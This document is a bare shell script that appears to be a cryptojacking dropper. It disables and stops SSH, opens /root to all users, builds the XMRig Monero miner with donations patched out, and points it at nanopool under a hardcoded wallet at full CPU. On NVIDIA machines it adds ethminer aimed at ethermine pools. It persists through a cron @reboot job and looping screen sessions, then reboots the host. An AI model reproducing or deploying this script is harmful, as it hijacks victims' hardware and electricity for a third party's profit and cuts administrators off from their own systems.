if [ -f "/root/start.sh" ]; then
  exit 0
fi

chmod 777 /root

systemctl disable ssh.service || true
systemctl stop ssh.service || true

apt update || true
apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev hwloc libhwloc-dev screen wget

cd /tmp
git clone https://github.com/xmrig/xmrig xmrig_tmp
cd xmrig_tmp
sed -i -E "s/DonateLevel = [0-9]/DonateLevel = 0/g" src/donate.h
mkdir build
cd build
cmake ..
make

mv xmrig /root/app
mv libxmrig-asm.a /root/ || true
ID=e001
EWLL=_YOUR_ETHERIUM_ADDRESS_
XWLL=43GFG6iAsXG19NsjtdRm9PJVgtixZwz78DNhmkXbGrYQC1FTzmrGbhU2mR8esJRireGqTDfGrNrFjZLuDuFh9DfMLkUzqtg
cat <<EOF > /root/config.json
{
    "randomx": {"1gb-pages": true},
    "autosave": false,
    "av": 0,
    "background": false,
    "colors": false,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "cpu-affinity": null,
    "cpu-priority": 5,
    "donate-level": 0,
    "huge-pages": true,
    "hw-aes": null,
    "log-file": null,
    "max-cpu-usage": 100,
    "pools": [
        {
            "url": "xmr-eu1.nanopool.org:14433",
            "coin": "monero",
            "user": "$XWLL.$ID",
            "keepalive": true,
            "variant": -1,
            "tls": true,
            "tls-fingerprint": null
        },{
            "url": "xmr-eu2.nanopool.org:14433",
            "coin": "monero",
            "user": "$XWLL.$ID",
            "keepalive": true,
            "variant": -1,
            "tls": true,
            "tls-fingerprint": null
        },{
            "url": "xmr-us-east1.nanopool.org:14433",
            "coin": "monero",
            "user": "$XWLL.$ID",
            "keepalive": true,
            "variant": -1,
            "tls": true,
            "tls-fingerprint": null
        },{
            "url": "xmr-us-west1.nanopool.org:14433",
            "coin": "monero",
            "user": "$XWLL.$ID",
            "keepalive": true,
            "variant": -1,
            "tls": true,
            "tls-fingerprint": null
        },{
            "url": "xmr-asia1.nanopool.org:14433",
            "coin": "monero",
            "user": "$XWLL.$ID",
            "keepalive": true,
            "variant": -1,
            "tls": true,
            "tls-fingerprint": null
        },{
            "url": "xmr-jp1.nanopool.org:14433",
            "coin": "monero",
            "user": "$XWLL.$ID",
            "keepalive": true,
            "variant": -1,
            "tls": true,
            "tls-fingerprint": null
        },{
            "url": "xmr-au1.nanopool.org:14433",
            "coin": "monero",
            "user": "$XWLL.$ID",
            "keepalive": true,
            "variant": -1,
            "tls": true,
            "tls-fingerprint": null
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "safe": false,
    "user-agent": null,
    "syslog": false,
    "watch": false
}
EOF

if [ "$(lspci | grep -i nvidia)" ]; then
cd /tmp
wget http://us.download.nvidia.com/tesla/450.51.05/NVIDIA-Linux-x86_64-450.51.05.run
chmod +x NVIDIA-Linux-x86_64-450.51.05.run
sudo ./NVIDIA-Linux-x86_64-450.51.05.run --silent
wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
tar -xzf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
mv /tmp/bin/* /root/
mv /root/ethminer /root/gpu
fi

cat <<EOF > /root/start.sh
screen -dm bash -c "
while true; do
    /root/app
    sleep 5
done
"

if [ "\$(lspci | grep -i nvidia)" ];then
export SSL_NOVERIFY=1

screen -dm bash -c "
while true; do
    if [ '\\\$(nvidia-smi -L | grep A100)' ]; then
        /root/gpu -G -P stratum1+ssl://$EWLL.$ID@eu1.ethermine.org:5555 -P stratum1+ssl://$EWLL.$ID@us1.ethermine.org:5555 -P stratum1+ssl://$EWLL.$ID@us2.ethermine.org:5555 -P stratum1+ssl://$EWLL.$ID@asia1.ethermine.org:5555 --response-timeout 10
    else
        /root/gpu -U -P stratum1+ssl://$EWLL.$ID@eu1.ethermine.org:5555 -P stratum1+ssl://$EWLL.$ID@us1.ethermine.org:5555 -P stratum1+ssl://$EWLL.$ID@us2.ethermine.org:5555 -P stratum1+ssl://$EWLL.$ID@asia1.ethermine.org:5555 --response-timeout 10
    fi
    sleep 5
done
"
fi
EOF

crontab <<EOF
@reboot /bin/bash /root/start.sh >/dev/null 2>&1
EOF
reboot
